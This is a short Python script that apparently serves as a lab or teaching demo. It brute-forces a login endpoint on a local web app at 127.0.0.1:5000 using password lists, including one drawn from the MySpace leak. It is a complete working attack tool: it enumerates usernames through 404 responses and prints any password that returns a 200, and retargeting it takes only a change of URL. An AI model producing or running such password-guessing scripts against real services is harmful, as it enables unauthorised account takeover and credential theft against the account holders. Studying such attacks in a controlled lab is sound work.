import sys

import requests


def main(username, use_myspace=False):
    if use_myspace:
        password_file = 'password_lists/myspace.txt'
    else:
        password_file = 'password_lists/common_passwords.txt'

    with open(password_file) as password_list:
        passwords = password_list.read().split('\n')

    for count, password in enumerate(passwords):
        data = {
            'username': username,
            'password': password
        }

        resp = requests.post('http://127.0.0.1:5000/login', data=data)

        if resp.status_code == 404:
            print(f'Username {username} is not valid')
            return

        elif resp.status_code == 200:
            print(f'Password for {username} is {password}')
            return

        if count % 10 == 0:
            print(f'Tried {count} passwords')

    print(f'Could not find password for {username}')


if __name__ == '__main__':
    username = sys.argv[1]
    use_myspace = '--use_myspace' in sys.argv
    main(username, use_myspace)
